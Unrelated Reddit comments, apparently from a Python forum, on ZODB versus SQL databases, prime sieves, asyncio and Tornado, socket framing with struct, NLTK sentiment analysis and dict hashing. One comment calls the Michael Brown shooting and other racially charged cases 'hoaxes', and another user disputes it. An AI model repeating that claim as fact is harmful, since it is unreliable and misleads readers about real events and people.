Oh, you've edited while I was working it out. This one makes a lot more sense. :) c applies a list of functions to an argument, e.g: &gt;&gt;&gt; c(math.sqrt, math.cos)(1) 0.7350525871447157 is equivalent to: &gt;&gt;&gt; math.sqrt(math.cos(1)) 0.7350525871447157 But with longer lists of functions this notation saves a lot of parentheses, improving readability. E.g: some(list(of(funcs(applied(to(an(argument))))))) becomes c(some,list,of,funcs,applied,to,an)(argument) 
These are my first hand experiences...others experience my differ so take this with a grain of salt. I worked with it for about four years on a legacy system that was the company's cash-cow. **I'd prefer to never use it again.** First off, fail-over and clustering were awkward and unreliable. If you need to build a distributed system or even a webapp that has to be scaled horizontally you will likely need to look to [ZEO] (http://old.zope.org/Products/ZEO/ZEOFactSheet/) which in all honesty was the weakest link in our product due to almost non-existent instrumentation or management tools and reliability issues we experienced. If you use it be prepared to spend time parsing logs manually or with tools like splunk or sentry. Also, as the number of users we added to the system grew (not a lot really...maybe a few thousand concurrent), we saw more and more ZODB conflict issues. Next, it was damn slow for everything except reads (which it really excels at) under heavy load. Finally, nobody uses it figuratively speaking....so it has a tiny user community and finding people that want to work with ZODB becomes more difficult. TLDR; I hated it and found it to be awkward, slow and unreliable in production.
Surprised its not posted here yet. and I am not the author.
As a DBA I tend to wonder why programmers don't just use standard RDBMS systems. Something like PostgreSQL is very, very good in all but a few edge cases. It seems like a certain amount of developers just go out of their way to use something new, rather than something proven, and when it comes to databases, that is not typically a great idea.
Did you ever try Django? I've used it to implement several projects in a similar time frame. One of the things that attracted me to it was how similar the ORM was to operating on a native Python object the way ZODB allows, but while also supporting schema migrations.
Tell him to experiment with holding down a key on the keyboard to lock the orientation of the wood he's placing (so a player doesn't have to fidget so much to build things).
It's interesting for a one-liner, but it's far from the fastest way to do it. def primes_below(n): n //= 2 sieve = [True] * n primes = [2] i = 0 try: while True: i = sieve.index(True, i + 1) p = 2 * i + 1 primes.append(p) sieve[i + p::p] = (False,) * ((n - i - 1) // p) except ValueError: return primes For n = 10,000,000 this is roughly 3.75x faster. They are approximately tied at n = 10,000, and the one-liner starts to become faster for smaller values of n.
Why not just write this as True == 1? Because thats all you are actually showing. Bool is a subclass of int.
[Py2.6+ and Py3.0+ backport of Python 3.3's LRU Cache](http://code.activestate.com/recipes/578078-py26-and-py30-backport-of-python-33s-lru-cache/)
I get the point, we have things that work, might be i should just stick with that. But having a option to store object directly opens up many other ways to solve a problem, Esp things that you could do with list comprehensions, groupby, i mean most of the itertools could put to a effective use. I don't mean to say that these don't work when i use a RDBMS(ORMS do it to some extent ). 
*There's one and only one obvious way to do it* **Today i realize. **
Gensim offers some tools for sentiment analysis. It get's rather math intensive with a lot of linear algebra jargon, but there are some great tutorials that walk you through some basic analysis. Also, NLTK is always a good option. You can pull out ngram collocations (phrases of n size that have actual meaning and are significant to the document of text). Good luck! 
I know for sure you can store python lists directly in PostgreSQL I havn't had experience with other types, but you can even use python for any stored procedures on the DB side of things if you like. 
Would be cool if it analyzed and tallied every word rather than searched for specifics.
&gt; In the buffer. What buffer exactly? 
Ah I did not know that we could have lists directly stored, thanks for that, i will look into it. 
Cool that he's working on it, but that kind of block looks *super* tedious to use, except for maybe those who want a wooden house making simulator!
I personally used Gensim in a project while a colleague of mine used NLTK at the same time. I have to say NLTK is a lot easier to use for sentiment analysis, so I'd start with that.
As far as I can see, pandas immediately listifies anything you pass to the DataFrame constructor. I haven't checked, but I'd assume that it does the same with the results of a SQL query. Having Pandas do the query would remove the opportunity to save memory by string folding.
Well, if this is so ridiculous, maybe you could articulate a meaningful difference, rather than indulging in snark?
Ugh...interesting but I'd rather not see any Ferguson related stuff here...
black isn't a keyword... 
I don't know about this. As a professional software developer I use unreadable one-liners way more than I use high quality libraries for ubiquitous IO protocols. 
I'd definitely agree, for the given task NLTK is probably the better option. But it's nice to know that Gensim exists as well.
Yeah, I know its not the fastest way.. What happened was that someone challenged me that it couldn't be done in a single line... I did that, and then took it to an extreme... Turns out it was nearly as fast as a coworkers haskell implementation (non-one liner).. I'd be interested in a faster, pure python, one liner.. I'm sure it can be done, just not sure how.. Getting rid of the sets would probably help.
It's a cool idea, but I wouldn't want to enforce PEP8 compliance for all code. PEP8 itself states that it's not meant to be followed unconditionally.
any screenshots?
It might be useful to use a `Counter`. Especially because then you can use `most_common(10)` and not have to wade through all the noise. Also, maybe NLTK.
Here's a bad answer. It's bad because it unnecessarily uses a third party library, and it's bad because it assumes you're on some unix variant with `wc` available. from plumbum.cmd import wc from plumbum import local txts = local.path('/home/seb/Learning') // '*txt' print( sum(int(wc('-l', txt).split()[0]) for txt in txts) / len(txts) )
this would have been better as a blog post that could have then been posted here for much internet points. 1-
In those situations, sure, use `(object)` everywhere. Write your code like it's 3 but make accommodations for 2. But if you have a choice...
I found this at Europython's Amazon booth: class A(str): pass a = A('a') d = {'a': 42} d[a] = 42 print type(d.keys()[0]) It's very interesting since you can talk about the inner working of dictionary and how they're implemented in Python.
Click the link...
&gt; Honestly I find that hard to believe Then you have never deployed python or prob any other code to a lumbering megacorp. Changing python compatibility regularly would remove one reason for its fast adoption.
Really it should just be: from collections import defaultdict def tree(): return defaultdict(tree) No need for the lambda since defaultdict just needs a callable that doesn't require any arguments.
github doesnt display them for mobile. my bad
/r/shittyprogramming
What was the purpose of searching on FTP? Is that to filter out file trans....ohhhhhh...wait...nevermind. 
I recently watched a fascinating talk about sentiment analysis by Ryan Rosario (http://youtu.be/y3ZTKFZ-1QQ). You are basically doing a simple form of the "bag of words" approach, but there is a lot of interesting Python code out there to try and make sense of the data you have collected. I hope this leads you down the interesting path of machine learning. 
As well as having a set of common words like 'the', 'is', 'I', etc to filter those out. 
Wow! I didn't know you could make a program like this in so few lines of code! Thanks for sharing!
The first one: In ASCII, the bits of a lower case and an upper case characters are the same, except for the 32bit, which is on in lower case and off in upper case. You can ^ 32 the ord and then chat to solve it. The second one - Try it with func([1,2,3,4,5,6],3) and you will see yourself.
Yes, I already made it. Also now possible to select mode for Writer - append new data or rewrite :)
&gt; primes2upto = lambda limit: itertools.chain([2], (p for p in xrange(3, limit, 2) if all(p % d != 0 for d in xrange(3, int(p**.5)+1, 2)))) Ok, thats far faster than what i was doing.. I didn;t think the trial division would be faster...Nice! The problem with the sieve is trying to do it in a single line.. You have the issue of trying to remember what the previous numbers are. What i implement essentially was a sieve, but instead of eliminating the non-prime numbers, I remember the nonprimes in a set.. Then when I'm done, I subtract that set from the list of all numbers to arrive at the prime list. Awkward. 
Excellent, I'll try once an interpreter is handy
And put it all in a word cloud! (Or, are word clouds now passé?)
The problem is that you're running one thing in the event loop and one thing outside of the event loop. The event loop will run to completion before it executes the things after it. You could make it work this way: import asyncio import time @asyncio.coroutine def sleepy(): print("before sleep", time.time()) yield from asyncio.sleep(5) print("after sleep", time.time()) @asyncio.coroutine def counter(): for x in range(10): print(x) yield from asyncio.sleep(1) asyncio.async(sleepy()) asyncio.get_event_loop().run_until_complete(counter()) 
Just word counts doesn't tell the whole story. It would be much more interesting to find words that occur more frequently in Tweets about X (in your case Ferguson) than in normal tweets. For example, the word "the" is probably used very often in the X feed but not more frequently than in normal tweets. The word "loot" might be used less often than "white" in the feed but its frequency is probably much higher than in the normal twitter stream. I.e. grab a general twitter feed, compute word frequencies, during the same time grab the feed for X and compute the word frequencies there and then find the words that are used with abnormally high or low frequencies. 
Maybe this: http://stackoverflow.com/a/18022601/743775
It is, when you're the US government.
The ZODB is not a relational database system. That's the important difference.
Awesome that makes sense, so you have to do it all in the async event loop. That works perfect thanks!
I'd like to spend as little time as possible. Regex is still a concern for me because for example, list of car brands, there is so much variance but there is a limited set of what we perceive as a car brand. Ultimate goal is for data alignment. For example, I want all the strings that fall under a category (e.g. Car brand) without any accidental data falling into it (e.g. name of a automotive service shop).
Take any arbitrarily port above 1024 and you should be fine. If you control the boxes you're deploying on you should already know what needs to listen on a given port. If you're guessing for your users just pick anything above 1024 and hope for the best (and provide a way to change it easily).
A couple of tricks for one-liners that I've come up with (certainly others have come up with them too): For recursive lambdas, use unpacking to trick the interpreter into creating a symbol for you: func, func = None, lambda x: func(x+1) For creating variables in-line while bypassing the Python assignment-as-a-statement: globals().__setitem__('var', "big computation you don't want to repeat but whose value you want to reference later") or var On an old version of Python you could create self-referencing comprehensions I think by using `sys._getframe(0)` or the `inspect` module, but I don't remember the details and it wouldn't be guaranteed to run on every implementation of Python. If anyone knows of a way to do this now (`[x+1 for x in self if x%2]` or something) let me know. 
Heavens that's disgusting. 
I've only watched the first bit, but it seems like a really cool talk. There was also a [talk by Julie Lavoie](http://pyvideo.org/video/2658/analyzing-rap-lyrics-with-python) at Montreal PyCon last spring along similar lines, but it looks like Rosario's goes into more depth.
I've personally used, and found [Tornado](http://www.tornadoweb.org/en/stable/) to be a very nice async framework, especially working with websockets. There's also [Twisted](https://twistedmatrix.com/trac/) which gets mentioned a lot, however I haven't used personally.
Thanks will look into it
What's the name of this property? I've tried googling a few terms, but I'm not coming up with much.
socket.recv(int buffer_size) &lt;-- that one
I'd say do something which invloves meta classes. I guess you can consider this advanced. If you've never worked with them, it's like magic and once you understand them it changes the way you think of classes. That's what it did for me at least. And they're extremely helpful when used right.
&gt; func, func = None, lambda x: func(x+1) Why would you need this? `func = lambda x: func(x+1)` works fine. Well, at least as well as your version (i.e., exceeds recursion depth).
You oughta x-post this bad boy to /r/shittyprogramming .
One minus negative one is two.
Oh, I feel like an idiot now.
Odd - in the past I've gotten `NameError` from doing that. 
https://github.com/cluzz/sat/blob/master/satlib/TCP/TCP.py
So yet another high-profile, news-media-whipped-up "white on black" crime turns out to be a hoax. Tawana Brawley, Duke lacrosse, Zimmerman, Michael Brown. It's almost like they're desperate to find such a story. 
So, this [string folding] optimization is not (yet?) a pull request to pydata/pandas?
Much brave. 
d3.js edit: you just shove some json and he will do all the magic
I can vouch for Tornado, it's a great framework. It also supports Python 3, unlike Twisted.
Much empty. He's not wrong.
As the others say, Tornado is awesome for async.
Jython is one of the slowest python implementations available. On average you need three to four concurrent cpu bound threads just to break even with single threaded cpython. Its simply not even in the race from a performance perspective. Jython's best feature is that you can add python scripting to a java project. If performance is you're focus, your using it wrong. 
saying an ORM and an object database "do the same thing" is like saying a submarine is just like a bicycle: they both "get you from point A to point B, right? what's the difference? it's up to you to explain to me why exactly a submarine and a bicycle are just so very different. I'm not seeing it". that's kind of what your comments look like. hit the google.
What's beautiful about Tornado is that it can now run off the asyncio event loop, meaning you can use asyncio inline with the rest of your tornado code. It's pretty cool stuff!
And it does it with a fancy data structure that lets it efficiently drop off the ones that haven't been used in a while.
I understand the difference. The main qualitative difference is that oodbs have less functionality.
 import os for file in os.listdir('.'): if file.endswith('.txt'): # do something pass 
Your lambda. It works for the handful of numbers I threw at it. I assume it's based on some theorem or named mathematical property. I went googling for it, but I didn't have much luck without a name.
This is what I saw when I googled. Cython seem to be the answer. But it's way too complicated :/ 
As far as I'm aware, there's no compelling reason to use IronPython, unless you have an existing C#/.NET codebase you need to interoperate with (or perhaps your doing something new, but there's a C#/.NET library that is so compelling, and has no equivalent in another language).
Sorry I don't have much experience except using ctypes on DLLs.
Thanks for the reply. What what I've Googled, it seems like everything you would do in python for .NET can just be done in C#. I just didn't know if there was an awesome reason to actually mix the 2. Thanks again. 
Most of what you're doing in this code is already taken care of for you by TCP. First, I recommend you look through the documentation for *socket*, in particular the [examples](https://docs.python.org/2/library/socket.html#example) section. Play with the echo client/server to help you get an idea of what's going on. Then, *SocketServer* adds another layer of convenience on top of socket to help you implement the server end. There are some good [examples](https://docs.python.org/2/library/socketserver.html#examples) in the docs for that as well. Going back to the problem in your post, one simple method to send a large stream of data is to first send a fixed-length byte-string (not packet, which is a lower-level concept) containing the total size of the data you want to send. Then send the data. TCP will take care of the rest: ## sender # struct is a useful module that will pack data types into byte-strings # 'Q' will pack a single unsigned long long integer # '&gt;' enforces big-endian byte-order (always good to pick one explicitely) # this gives you 8 bytes for the size of your data # more than enough for any size data you're likely to send fmt = '&gt;Q' # size will be a string here size = struct.pack(fmt, len(data)) sock.send(size) sock.send(data) ## receiver fmt = '&gt;Q' # size will be a int here size = struct.unpack(fmt, sock.recv(8)) data = '' while len(data) &lt; size: # we don't want to receive more data than the amount remaining to receive buf_size = min(BUFFER_SIZE, size - len(data)) data += sock.recv(buf_size) There are other ways to do it, but that's off the top of my head. The important point is that TCP is already taking care of ordering, retrying, etc.... You'll want to spend some time reading more Python code, and maybe asking questions on /r/learnpython.
(((2**n) - 1) % n) == 1 is how it simplifies, right? I'm half asleep, however, this is how I tend to code, so it makes reasonable sense to me. 
SSE? Server-sent_events?
What you're looking for is an 'idle' event. Basically, you wait until the GUI library tells you it's not doing anything, then check to see if anything is on your queue. I haven't done this with wxPython but [this](http://wiki.wxpython.org/LongRunningTasks) looks like a good place to start.
That hasn't been shown to be the case. Eyewitness accounts and the autopsy show be had his hands up. Also the police department already admitted that the cop tried to shoot the unarmed kid in the back while he was running away before the final shots were fired. I doubt you'd accept the truth about what black communities put up with if you saw him get shot with his hands up with your own eyes. Not that this is the place for either of us to comment about it, but I don't like letting your statement stand without a response.
Which bugs? I think he mentions something like three across the five blog posts, and he mentions that two of them have been fixed.
How does that justify racist cops abusing their authority against people of color? Even if it is true.
Well, the "why" would simply be if you wanted to program in python and use the CLR. Its the same "why" as to using vb.net, Boo or any number of other languages targeted for the runtime. I'm glad to see it as well as Jython, Pypy, and any other implementation that may increase interest in Python.
I love Tornado, but I still sometimes have trouble getting my head around all the callbacks. 
Look at Twisted. It has binding for wxPython. Twisted has its own event loop by means of what You can do asynchronous operations. Your approach is also legit, but be careful with threads and remember that You can update GUI only in main thread.
Flask cannot be async by design, because WSGI is architecturally based on locking operations. In best case You can run flask with gunicorn (it already has asyncio workers), but this is not what do You want. Tornado + asyncio if You need framework + web-server. Twisted is powerful but lil bit hard to learn and doesn't support asyncio. But my experience showed me, that if You want to do good async service - stick with golang - its much easier and faster (actual work and development) for such tasks.
What about win32 python module? As i remember it was possible to do some like that. Anyway, task sounds like it should be written in something more low level and windows friendly.
&gt; print type(d.keys()[0]) Fixed: &gt; print type(list(d.keys())[0]) (d.keys returns an iterable, not a list, in py3)
ZODB should really be called Persistant Python. That is very different from a database. If you want a database, get a database. And then deal with maintaining the database, and the python code, and reading and writing between the two. If you just want to build a persistent python application, then get the ZODB. You have to compare at the level of the architecture of your system, rather than making point decisions. 
You can spawn processes using [subprocess](https://docs.python.org/2/library/subprocess.html).
No, not yet. But it could be... that's an interesting idea. 
for the people
https://github.com/hakimel/reveal.js/
Not in Python 2.7.
And Object-Relational Mapping is the Vietnam of Computer Science: http://blog.codinghorror.com/object-relational-mapping-is-the-vietnam-of-computer-science/
`os.system("/cloudy inputfile_name")`
Some tools of the trade: 1: If you're working with the zope ecosystem, you'll use zope.interface and zope.schema those will help validating types and values, etc. But sometimes you'll want to just save some sh*t, then with an RDB you dump it as text.... 2: There is https://pypi.python.org/pypi/zodbbrowser for investigating ZODB inner life. If you want to query a ZODB, most people say your query lang is python. Of course there are packages that help with building an index and querying. The point is that an Object oriented query language is HARD. 3: Best practice is to iterate over all objects of a type or even all objects in the DB. That is what probably happens within an RDB engine too you just don't have to care. 
I get those errors from both `pyimgur` and `praw` I think `praw` might actually have some kind of *close socket* function that when run at the end of your script mitigates that warning, but `pyimgur` has no such method. Which sucks.
Is it really THAT simple? Yes!! I will try this when I wake up 
Except I've tried the close socket function (or at least what I thought was it) and it didn't change anything.
Sorry, I don't see the point of that, and I don't know what it tells you about the inner workings of dicts. A much simpler way to demonstrate the same thing: d = {1: 'x'} d[1.0] = 'y' print(d) which prints `{1: 'y'}`. What that tells me is about the public API of dicts, not their inner working: two keys are considered "the same" if they are equal (and have the same hash, although you can't see that from the example given). Since 1 and 1.0 are equal, as are your A('a') string and 'a', they are the same key. Here's a different way to get a glimpse of the inner-working of dicts: from timeit import Timer setup = "d = dict.fromkeys(range(10000))" t1 = Timer("d[9999]", setup) print(min(t1.repeat(number=1000))) When I run that on my computer, I get about 0.0002 seconds. Now run this instead: class Special(int): def __hash__(self): return 42 d2 = dict.fromkeys(Special(i) for i in range(10000)) setup = "from __main__ import d2, Special" t2 = Timer("d2[Special(9999)]", setup) print(min(t2.repeat(number=1000))) When I run that, I get about 0.7 seconds, or around 3500 times slower. Why is dict lookup so slow in the second case? Because all of the keys hash to the same value, which makes the search for the matching key degenerate to a slow linear search through all the keys in the dict. To explain further, for those who don't understand how dicts work, in the first case the dict lookup d[9999] hashes 9999 to get an index into the dictionary hash table (just a big array really). It doesn't matter what that index is, but if you care you can call the hash() function on any object and see what it returns. Python looks at the key at that index, checks that it equals 9999 (it does), so it knows it has the right key, and returns the value. In the second example, Python hashes the key Special(9999), gets the index 42. It looks at that index, discovers the key there is 0, not 9999, so checks the next index. There it finds key=1, so it moves on to the next index, finds 2, and so on, until eventually it finds 9999, and returns the value. I don't necessarily mean that "checks the next index" means the slot in the array exactly one place over. The indexes being checked could jump all over the array. What's important is that because all the keys collide with the same hash value, every slot checked already has a key in it, and it's the wrong key, so Python has to keep on looking until its seen all 10,000 keys. 
When using Qt, you can use the signal/slot mechanism to send signals from the worker thread to the slots of the gui objects.
So yes, choose the right tool for the given problem. Some properties where ZODB shines: * Transparent persistence for Python objects That is the most important. Throw (almost) any object structure at it, it writes the data to disk, then you can get it back. Try that with an ORM or noSQL DB. Of course if you want performance, you might need to optimize that structure (you'll do that anyway with most DBs). This is pretty handy for doing quick MVPs and more. * Full ACID-compatible transaction support (including savepoints) Yeah and it works. Of course there are conflicts coming from this, that you can/want to handle. But concurrent writes to the same object (record) will always cause problems. Taken as granted for RDBs, but show me a noSQL DB that does this right. Lesser known properties: * It caches objects in RAM (what's faster than that?), fully instantiated (what's slow in python? object instantiation) while handling cache invalidation (solving another basic hard problem). * It's a mix of a key-value store (where the key is a long int, value is a pickle) and an object graph database (objects can reference objects) * It works without the huge ZOPE server. It will pull quite some zope packages as dependency, but you don't have to use those. See also: http://www.zodb.org/
Sorry, should say lambdas are discouraged when working on collections. And I know this is not a 1 to 1 mapping. But the swap is possible in many cases. If you ever used 2to3 you would notice it does that automatically (especially when using map and/or filter). And this is not a syntactic sugar, but a performance necessity. Lambdas in dynamic languages are just slow.
we have no idea what else you're running and what ports they are using. just pick a random number over 1024 and be done with it. you can check what's currently in use and by what programs with: &gt; sudo netstat -ntlp
&gt; I thought about trying it but it looks like the versions don't match up since I am more familiar with python3.3 than python2.7. PyCharm works with both python 2.x and 3.x
I use Eclipse/Pydev with Kivy and it works just fine. As admiralswan said, you have no support with .kv files, but I highly doubt there is any IDE that works with .kv files, seeing that Kivy is not popular or mature. As for getting IDLE to work with Kivy, I have no experience with IDLE, but in Eclipse you can set the python interpreter: I installed the portable version of Kivy and have it set as the interpreter. Perhaps you can do the same with IDLE? 
prefer to use `subprocess.check_call(["./cloudy", input_filename])` or `subprocess.check_output(["./cloudy", input_filename])`. They do error checking on the return code, handle things like spaces or other special characters in filenames, and `check_output()` provides an easy way to read what the program prints to the screen in python.
I'm still not sure what Vera actually is.
nltk.stopwords("english") Though you'd probably need to add some extra words for tweets, I always do. Maybe throw in RT and things like that.
Well I reported the code as it was. Since it was a quiz it had to be a little convoluted. Also, I think that the best for a student would be to analyze your two examples and then the one I provided. He should understand that they do fundamentally the same thing, albeit in a different manner (as you have shown with timeit).
I think you can just get NLTK to do that.
Change to save/update the file every minute or something, that way if it crashes, you don't lose it.
Please see this comment: http://www.reddit.com/r/Python/comments/2e5gfh/zodb_should_i_use_it/cjxa2il ... and try ZODB out if you have not yet experience with it :)
Yes, using a timer thread like that is a good solution. Keep in mind that GUI updates should occur in an actual wx thread, so perform the update itself in a wx callback, like: wx.CallAfter(mytextbox.AppendText, newstring)
That is pretty simple to do without using subprocess, just have a mainloop poll a directory for new python scripts (you can use inotify for that) and then use the imp module to load the script and execute the function you need. http://pymotw.com/2/imp/
&gt; Flask itself discourages […] async programming You have to consider what it means to do async programming. A request/response cycle inherently is a synchronous operation as far as your contract to the outside world goes. What you do internally really is not flask's or your WSGI server's concern. If you look outside of the Python space, asynchronous programming usually is not linked to green threads. For instance if you look at async programming in other languages it's usually tasks that run on a thread pool or something similar. If Flask would be running on an environment like that you would just spinn of your work, make it run on a thread pool, wait for all results to come back and report the result to the server. It makes absolutely no sense to have huge number of requests in flight because at one point they will have to block again anyways to stand in line to go to the database. At that point you might just wait for a spot on a worker to get free and handle the socket waiting on the WSGI server.
Hi there. Rather than asking for the answers here, you can ask the tutors for help on our forums. They can look at your code and help you solve the questions yourself! There aren't many opportunities where you have lots of university tutors and software engineers waiting to help you learn to program, and who are happy to look at your code and help you identify, understand and fix any bugs you've got. You should take advantage of it! 
I still do not get it! Perhaps you can try to explain the big picture more precisely? As far as I have understood so far, you have multiple Python scripts that you want to start (in a sequential manner). And you want to have **one** Python script, that does that job. And for that scenario my proposed solution ist the easiest and most succinct one I could think of :-)
Because they do? [kingkilr](http://www.reddit.com/user/kingkilr) for example.
Ok, I've tried to implement a sieve based on python's reduce function, which allows us to use the accumulator to keep track of primes: reduce(lambda a, p: a + ([p] if all(p % d for d in a) else []), range(3,100,2), [2]) Which works. Output: [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97] It is short and readable, but it is not particularly fast, sadly, because it needs to overwrite the accumulator on each iteration. Primes upto 100,000 takes several seconds, upto 1,000,000 more than a minute. 
RT would be an interesting one to know, though.
Well, RDBMS makes life easier for DBAs and data analysts, but RDBMS in itself is not the holy grail of data storage. Object persistence a la ZODB makes development much faster and easier in the right circumstances.
The beauty of ZODB is that you don't really need much of an API. You do [the motions](http://www.zodb.org/en/latest/documentation/guide/prog-zodb.html#opening-a-zodb) to get a connection open, get the root dict, and then just add objects to it and commit transactions.
Yeah, even the most rabid python hater would concede that python runs *python* modules really quite well by itself.
You should use TF-IDF that not only counts all the words in your corpus (tweets about Ferguson), but also offsets it by how frequent the word is in all the documents (all the tweets). I would expect the term 'white' to be quite frequent in the English as a whole. There's a ready-to-use implementation of TF-IDF in `scikit-learn`.
the author of a very popular, well used library which includes an orm, also disagrees with you. congrats.
On a single core system you are essentially swapping between each thread one at a time. In python that usually means that threads are switched when the current one starts waiting for I/O (that's not the only reason they switch, but let's keep it simple). So if you have one thread that reads a file and another thread that does computations you should see a performance increase because processor time isn't wasted on the thread waiting for I/O. That processor time can be used for computations. And with single core machines load average doesn't mean much in my opinion. You have one core so you're load average will be high because it can only run one thing at a time. With most operations you could probably get away with no locks I think, but it depends on specifically what you're doing/using.
In fact, I used IronPython *a lot* to explore and learn the .NET Library. I found it way easier than to use C#... :-)
Your string \u678a\u281\u5f1 looks like it has been mangled somewhere along the line, but if you keep everything as unicode you should have no problem storing anything coming from tweepy as long as your DB uses a UTF-8 encoding and you've configured SQLAlchemy correctly. Be careful not to confuse the unicode and byte string types, they are two completely different things. &gt;&gt;&gt; type(u'hello') &lt;type 'unicode'&gt; &gt;&gt;&gt; type(b'hello') &lt;type 'str'&gt; &gt;&gt;&gt; type('hello') # python 2.x &lt;type 'str'&gt; &gt;&gt;&gt; type('hello') # python 3.x &lt;type 'unicode'&gt; Trying to do string manipulation on bytestrings is a recipe for disaster. For example, "£" is one unicode character, U+00A3: &gt;&gt;&gt; print u'\u00a3', repr(u'\u00a3'), repr(u'\xa3'), len(u'\u00a3') £ u'\xa3' u'\xa3' 1 But 2 bytes when encoded into UTF-8 bytes: &gt;&gt;&gt; print b'\xc2\xa3', repr(b'\xc2\xa3'), len(b'\xc2\xa3') £ '\xc2\xa3' 2 On python 2, your regex does the following: &gt;&gt;&gt; re.compile(r"\u[a0-z9]+", re.DEBUG) literal 117 max_repeat 1 4294967295 in literal 97 range (48, 122) literal 57 &lt;_sre.SRE_Pattern object at 0x7f4a1b5de480&gt; Because the regex is a bytestring, python doesn't try to interpret the \u, so no errors there. But in a regex \u is a valid escape sequence. Since it's not immediately followed by hex it's dropped the \ and ended up with a literal u (literal 117). The next part [a0-z9] means any of "a", "9" or anything in the range "0"-"z", which means basically any tweet starting with u is going to be deleted: &gt;&gt;&gt; re.match(r"\u[a0-z9]+", u'umbrella') &lt;_sre.SRE_Match object at 0x7f4a1b636ed0&gt; If you want to remove anything outside of ascii you could use a regex like this (note the regex is itself unicode): &gt;&gt;&gt; re.search(u'[^\u0000-\u007f]', u'umbrella') &gt;&gt;&gt; re.search(u'[^\u0000-\u007f]', u'umbrella£') &lt;_sre.SRE_Match object at 0x7f4a1b636ed0&gt; But that loses you a whole load of beautiful unicode characters, which is very sad. Plenty of english words fall outside of that range, e.g. café. An alternative would be to use the built in character classes to filter out punctuation and things, which can handle unicode if the flag is set https://docs.python.org/2/library/re.html#re.UNICODE. There is also the unicodedata module which can be used for normalization. Also - do you need to filter out hashtags?
I'm only 10 minutes in, but this video is good! There're already some very solid examples about various patterns. Although I am confused, there seems to be a weird loop around 14-20 minutes and it starts again? 
I aways use 8080, 8081 and so on.
No, that is actually better the way it is currently (protocol relative URI). If they at some point decide to switch to https they don't need to change single thing in the html.
"Without defects" isn't necessary to implement a language specification. A defect implies it's an unintentional deviation from the spec. If we required an implementation to be bug-free to be considered compliant, we'd have no compliant implementations of all but the most basic programming languages. To be compliant, you simply can't have any *known* deviations from the specification (That you don't intend to fix). Once you've got known deviations that you don't intend to fix, you've changed the design. (And thus your design is no longer compliant with the specification) If you remove "without defects", yes, CPython is a compliant implementation of the standard. (We would be in trouble if it weren't, given that it's the reference implementation) For the 2.x series, Pypy is also a compliant implementation (I'm not sure if it's 3.x version is finished or not yet, but it should be soonish), as is Jython. (I'm not certain if jython is compliant. I think it is, but I haven't seriously looked into it, so I'm not certain. I believe IronPython is too, but I'm not sure) All of that being said, if micropython still doesn't intend to support unicode, it's willfully deciding to not support a core feature of the language that it required by the spec and thus it is not a compliant implementation of the language. 
Just watched the whole thing in one shot. This is a nice introduction to a topic that I have tried to learn previously, but could never really grasp before losing interest. I like how he shows examples of patterns that have already been implemented, either in the language itself (Iterator pattern), or in Python libraries (Builder pattern). I think a follow up with the Alex Martelli talk on the same subject would really help solidify things. Thanks for posting.
Woops, actually, you're right. I picked out the wrong one. I was actually meant to pick on this line: &lt;a href="%20learntocodewith.me" target="_blank"&gt;Learn to Code With Me&lt;/a&gt; 
&gt; But this fails to yield return output from each execution of process ABC and only records all of the output in file A, instead of storing them in separate files. That means that you don't create separate files. You did not post code dealing with creating and closing files, so it's hard to help you.
The [default implementation](http://hg.python.org/cpython/file/4be39be5230c/Objects/object.c#l1104) of `__hash__` returns a value [that is based on the object's address in memory](http://hg.python.org/cpython/file/4be39be5230c/Objects/object.c#l1080). `None` [does not reimplement it](http://hg.python.org/cpython/file/4be39be5230c/Objects/object.c#l2015). Obviously, the address of an object may change depending on what else is in memory at the time of its creation. Either way, if you need hashes to stay consistent between processes, you're clearly doing something wrong, especially considering that CPython has optional (mandatory in 3.3+) hash randomization (it's a security feature designed to prevent attackers from exploiting hash collisions in hashmaps to cause denial of service.)
`None` is a singleton instance of `NoneType`, which means that it doesn't need to be hashed -- there is only ever one instance of it, so its `id()` (i.e. its address) serves as its hash. Hashes cannot be relied upon to be stable across invocations, so this isn't a bug. Later versions of Python even introduce randomness into the hash functions to prevent denial of service attacks. 
what /u/Bolitho was describing is definitely the best way - you can still keep your stuff in separate files, like this: &gt;dir main.py sub1.py sub2.py sub3.py and then just have main.py look like this: import sub1 sub2 sub3 sub1.some_function(yourProcess,outputFilePath1) sub2.some_function(yourProcess,outputFilePath2) sub3.some_function(yourProcess,outputFilePath3) where each of the sub#.py files have some_function(proc,filePath) defined in them that takes your process, does whatever it was you need done, and saves the output to the path supplied. What /u/Gwenhidwy suggested is even more flexible, where you wouldn't have to modify main.py if you needed to add/remove subs - it would just loop through all the .py files in a directory, import them, and then run your function.
There are [instructions for using Kivy with PyCharm, PyDev (Eclipse), WingIDE, and Python Tools for Visual Studio](https://github.com/kivy/kivy/wiki/Setting-Up-Kivy-with-various-popular-IDE%27s) on the wiki.
I would support this advice. You must provide some kind of interprocess communication abilities, where the clients are just *"dumb"* things without business logic, that **uses** the ipc to get the job done. That way you will have a completly decoupled client, no matter if that is implemented as a native GUI or by a Web Interface. Easiest method nowadays seems to be some kind of (RESTfull) web service via HTTP. If speed matters, perhaps RabbitMQ and related stuff might also be an option.
I'm using Selenium WebDrivers mostly for automation. Something that bothered me when using it, is that there is no easy way to start downloads or sent custom HTTP requests to websites. What I did in these cases was using the requests library and the cookies contained within the webdriver instance to get access to whatever I wanted, if the start of the download required a login or something similar. This is a small module that adds a request function to the webdriver instance and does exactly this and some related stuff that might seem a bit strange at first. Before the actual request is made a local HTTP server is started that serves a single request made by the running webdriver to get the "standard" HTTP request headers sent by this instance; these are cached (only happens once during its lifetime) and later used in conjunction with the requests library to make the requests look identical to that of the webdriver. Since the get_cookies() method only returns cookies of the currently active window handle, all currently available window handles are searched for a domain matching the one requested and automatically switched to if found. In the absence of a matching window handle one is created and later closed again. Custom cookies and headers passed to the request method are merged with the ones retrieved from the webdriver and finally the request is made. If cookies are set by the HTTP response these will be automatically applied to the webdriver instance from which the request was made. Before the response object is returned to the calling code the original window handle is restored again. There might be something dumb in there or something I completely forgot about, but it seemed to work for me perfectly. I tested it with a Firefox and PhantomJS webdriver instance. Also I am aware that the "default" HTTP request headers for the given webdriver instance might look different for various reasons, but this is as close as I could get -- The Selenium API doesn't expose much more that is easier to work with.
Thanks. Yes, it wasn't the best idea to re-use the hash() function for generating unique, deterministic ids, but changing it would require a large refactoring (that I'm now attempting). However, the main issue is that `hash(None)` is stable on some machines (e.g. on my Windows machine), so I didn't expect it to change on other machines.
